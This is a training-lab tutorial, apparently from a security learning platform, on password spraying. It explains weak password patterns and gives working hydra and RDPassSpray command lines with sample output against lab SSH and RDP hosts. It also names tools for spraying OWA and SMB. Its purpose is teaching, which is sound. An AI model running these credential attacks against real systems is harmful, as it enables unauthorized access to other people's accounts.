# Password Spraying Attack

This task will teach the fundamentals of a password spraying attack and the tools needed to perform various attack scenarios against common online services.

Password Spraying is an effective technique used to identify valid credentials. Nowadays, password spraying is considered one of the common password attacks for discovering weak passwords. This technique can be used against various online services and authentication systems, such as SSH, SMB, RDP, SMTP, Outlook Web Application, etc. 

A brute-force attack targets a specific username to try many weak and predictable passwords. While a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy. The following figure explains the concept of password spraying attacks where the attacker utilizes one common password against multiple users.

## Common Weak Password Patterns

Common and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format include:

- **Season + Year**: For example, `Fall2020`, `Spring2021`, etc.
- **Month + Year**: For example, `November2020`, `March2021`, etc.
- **Company Name + Numbers**: For example, `TryHackMe01`, `TryHackMe02`.
- **Password with Symbols**: If a password complexity policy is enforced, passwords may include symbols, such as `October2021!`, `Spring2021!`, `October2021@`, etc.

To successfully perform a password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses).

## Password Spraying Scenarios

### SSH

Assume that we have already enumerated the system and created a valid username list:

```bash
user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy
```

We can use `hydra` to perform the password spraying attack against the SSH service using the `Spring2021` password:

```bash
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

- `-L`: Load the list of valid usernames.
- `-p`: Use the `Spring2021` password against the SSH service at `10.1.1.10`.

The output shows that we successfully found credentials.

### RDP

Assume we found an exposed RDP service on port `3026`. We can use a tool such as `RDPassSpray` to perform the password spraying attack. First, install the tool on your attacking machine by following the installation instructions in the tool’s GitHub repository.

To see the usage options, run:

```bash
user@THM:~# python3 RDPassSpray.py -h
```

Now, let's try using the `-u` option to specify the victim as a username and the `-p` option to set the password `Spring2021!`. The `-t` option is used to select a single host to attack:

```bash
user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

The output shows that we successfully found valid credentials `victim:Spring2021!`. If in an Active Directory environment, you can specify a domain name using the `-d` option:

```bash
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

### Other Services

#### Outlook Web Access (OWA) Portal

Tools:
- `SprayingToolkit` (atomizer.py)
- `MailSniper`

#### SMB

Tool:
- `Metasploit` (`auxiliary/scanner/smb/smb_login`)